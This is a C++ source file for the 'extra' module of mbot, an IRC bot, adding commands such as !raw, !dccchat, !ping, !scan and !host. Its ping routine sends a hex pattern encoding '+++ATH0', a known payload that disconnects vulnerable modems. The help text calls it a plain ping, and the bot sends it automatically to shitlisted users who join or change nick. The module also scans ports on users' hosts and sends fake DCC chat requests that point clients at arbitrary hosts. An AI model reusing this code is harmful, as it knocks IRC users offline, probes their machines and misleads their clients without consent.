/*

This file is part of mbot.

mbot is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or (at
your option) any later version.

mbot is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with mbot; if not, write to the Free Software
Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

*/

#include "mbot.h"

#define SOURCE s->script.source
#define DEST s->script.dest
#define BUF s->script.buf
#define SEND_TEXT s->script.send_text

#define LEVEL_RAW 10
#define LEVEL_DCCCHAT 10
#define LEVEL_PING 10
#define LEVEL_SCAN 10
#define LEVEL_HOST 7

#define HELP_RAW "!raw command - Send <command> to the server."
#define HELP_DCCCHAT "!dccchat nick host port - Send to <nick> a fake dcc chat request on <host>:<port>"
#define HELP_PING "!ping nick | host - Send icmp pings to <nick> or <host>"
#define HELP_SCAN "!scan nick port - Check if <nick> host's <port> is open"
#define HELP_HOST "!host nick - Show <nick>'s host."

struct extra_type {
  NetServer *server;
  bool akickping;
  extra_type *next;
};
struct extra_type *extra_list;

///////////////
// prototypes
///////////////

static void extra_cmd_raw (NetServer *);
static void extra_cmd_dccchat (NetServer *);
static void extra_cmd_ping (NetServer *);
static void extra_cmd_scan (NetServer *);
static void extra_cmd_host (NetServer *);
static void extra_add (NetServer *);
static extra_type *server2extra (NetServer *);
#ifdef PING_PATH
static void extra_pinghost (c_char);
static void extra_event (NetServer *);
#endif
static void extra_conf (NetServer *, c_char);
static void extra_stop (void);
static void extra_var (NetServer *, c_char, char *, size_t);

extern "C" {

EXPORT struct Module::module_type module = {
  MODULE_VERSION,
  "extra",
  NULL,
  extra_stop,
  extra_conf,
  NULL
};

}

/////////////
// commands
/////////////

// !raw command
static void
extra_cmd_raw (NetServer *s)
{
  strsplit (CMD[3], BUF, 1);
  if (BUF[1][0] == 0)
    {
      SEND_TEXT (DEST, "%s", HELP_RAW);
      return;
    }
  if (strlen (BUF[1]) > 6) 
    for (size_t i = 0; i < strlen (BUF[1]) - 7; i++)
      if (strncasecmp (BUF[1]+i, NICKSERV, 8) == 0)
        {
          SEND_TEXT (DEST, "NickServ access denied.");
          return;
        }
  s->writeln ("%s", BUF[1]);
}

// !dccchat nick host port
static void
extra_cmd_dccchat (NetServer *s)
{
#ifdef WINDOZE
  SEND_TEXT (DEST, "Command not available on Windows.");
#else		// !WINDOZE
  strsplit (CMD[3], BUF, 4);
  if (BUF[3][0] == 0)
    {
      SEND_TEXT (DEST, "%s", HELP_DCCCHAT);
      return;
    }
  char addrbuf[12+1];
  struct in_addr ipe;
  struct hostent *addr = gethostbyname (BUF[2]);
  if (addr == NULL)
    {
      ipe.s_addr = inet_addr (BUF[2]);
      if (ipe.s_addr == (u_int)-1)
        {
          SEND_TEXT (DEST, "Cannot resolve host.");
          return;
        }
    }
  else
    memcpy (&ipe.s_addr, addr->h_addr_list[0], addr->h_length);
  utoa (ntohl (ipe.s_addr), addrbuf, 12);
  SEND_TEXT (BUF[1], "DCC CHAT chat %s %s", addrbuf, BUF[3]);
#endif		// !WINDOZE
}

// !ping nick | host
static void
extra_cmd_ping (NetServer *s)
{
  strsplit (CMD[3], BUF, 2);
  if (BUF[1][0] == 0)
    {
      SEND_TEXT (DEST, "%s", HELP_PING);
      return;
    }
#ifdef PING_PATH
  int i2;
  for (int i = 0; i < s->channel_num; i++)	// search in channels
    {
      i2 = CHANNELS[i]->user_index (BUF[1]);
      if (i2 != -1)
        {
          mask2host (CHANNELS[i]->users[i2]->mask, BUF[3]);
          extra_pinghost (BUF[3]);
          SEND_TEXT (DEST, "Ping sent to nick %s.", BUF[3]);
          return;
        }
    }
  extra_pinghost (BUF[1]);
  SEND_TEXT (DEST, "Ping sent to host %s.", BUF[1]);
#else
  SEND_TEXT (DEST, "Ping command not available.");
#endif
}

// !scan nick port
static void
extra_cmd_scan (NetServer *s)
{
  strsplit (CMD[3], BUF, 3);
  if (BUF[2][0] == 0)
    {
      SEND_TEXT (DEST, "%s", HELP_SCAN);
      return;
    }
  int i2;
  for (int i = 0; i < s->channel_num; i++)	// search in channels
    {
      i2 = CHANNELS[i]->user_index (BUF[1]);
      if (i2 != -1)
        {
          mask2host (CHANNELS[i]->users[i2]->mask, BUF[4]);
          Net net;
          if (net.resolvehost (BUF[4], &net.addr)
              && net.create_tcp (atoi (BUF[2]), NULL, 1)
              && net.openhost ())
            SEND_TEXT (DEST, "Port open.");
          else
            SEND_TEXT (DEST, "Port closed or host unreachable.");
          return;
        }
    }
  SEND_TEXT (DEST, "Can't find that nick.");
}

// !host nick
static void
extra_cmd_host (NetServer *s)
{
  strsplit (CMD[3], BUF, 2);
  if (BUF[1][0] == 0)
    {
      SEND_TEXT (DEST, "%s", HELP_HOST);
      return;
    }
  int i2;
  for (int i = 0; i<s->channel_num; i++)	// search in channels
    {
      i2 = CHANNELS[i]->user_index (BUF[1]);
      if (i2 != -1)
        {
          mask2host (CHANNELS[i]->users[i2]->mask, BUF[2]);
          SEND_TEXT (DEST, "%s's host is %s.", BUF[1], BUF[2]);
          return;
        }
    }
  SEND_TEXT (DEST, "Can't find that nick.");
}

////////////////////
// module managing
////////////////////

// add a ctcp to the list
static void
extra_add (NetServer *s)
{
  extra_type *buf = extra_list;
  extra_list = new extra_type;
  extra_list->server = s;
  extra_list->akickping = 0;
  extra_list->next = buf;
}

// returns the extra for a given server, NULL if nonexistant
static extra_type *
server2extra (NetServer *s)
{
  extra_type *buf = extra_list;
  while (buf != NULL)
    {
      if (buf->server == s)
        return buf;
      buf = buf->next;
    }
  return NULL;
}

#ifdef PING_PATH

static void
extra_pinghost (c_char host)
{
  pid_t pid = fork ();
  switch (pid)
    {
      case -1:
        return;
      case 0:
        close (1);
        close (2);
        execl (PING_PATH, "mbot", "-p", "2b2b2b415448300d", "-c", "3", host, NULL);
        exit (0);
    }
  waitpid (pid, NULL, 0);
}

// look for shitlisteds in join and nick events
static void
extra_event (NetServer *s)
{
  extra_type *buf = server2extra (s);
  if (buf == NULL || !buf->akickping)
    return;
  if (EVENT == EVENT_JOIN)
    {
      // shitlist
      if (USERS.match_mask_level (CMD[0]) < 0)
        {
          mask2host (CMD[0], BUF[0]);
          extra_pinghost (BUF[0]);
        }
    }
  else if (strcmp (CMD[1], "NICK") == 0)
    {
      // make new mask
      mask2user (CMD[0], BUF[0]);
      mask2host (CMD[0], BUF[1]);
      snprintf (BUF[2], MSG_SIZE, "%s!%s@%s", CMD[2], BUF[0], BUF[1]);
      // shitlist
      if (USERS.match_mask_level (BUF[2]) < 0)
        extra_pinghost (BUF[1]);
    }
}

#endif	// PING_PATH

// configuration file's local parser
static void
extra_conf (NetServer *s, c_char bufread)
{
  char buf[2][MSG_SIZE+1];

  strsplit (bufread, buf, 1);

  // add these commands in each new server
  if (strcasecmp (buf[0], "bot") == 0
      && server2extra (s) == NULL)
    {
      extra_add (s);
#ifdef PING_PATH
      s->script.events.add ((void *)extra_event);
#endif
      s->script.cmd_bind (extra_cmd_raw, LEVEL_RAW, "!raw", module.mod, HELP_RAW);
      s->script.cmd_bind (extra_cmd_dccchat, LEVEL_DCCCHAT, "!dccchat", module.mod, HELP_DCCCHAT);
      s->script.cmd_bind (extra_cmd_ping, LEVEL_PING, "!ping", module.mod, HELP_PING);
      s->script.cmd_bind (extra_cmd_scan, LEVEL_SCAN, "!scan", module.mod, HELP_SCAN);
      s->script.cmd_bind (extra_cmd_host, LEVEL_HOST, "!host", module.mod, HELP_HOST);
      s->vars.var_add ("extra_akickping", extra_var);
    }
}

// module termination
static void
extra_stop (void)
{
  extra_type *buf = extra_list, *buf2;
  while (buf != NULL)
    {
#ifdef PING_PATH
      buf->server->script.events.del ((void *)extra_event);
#endif
      buf->server->vars.var_del ("extra_akickping");
      buf2 = buf->next;
      delete buf;
      buf = buf2;
    }
}

static void
extra_var (NetServer *s, c_char name, char *data, size_t n)
{
  extra_type *buf = server2extra (s);
  if (buf == NULL)
    return;
  if (strcasecmp (name, "extra_akickping") == 0)
    {
      if (n != 0)
        itoa (buf->akickping, data, n);
      else
        buf->akickping = (atoi (data) != 0);
    }
}

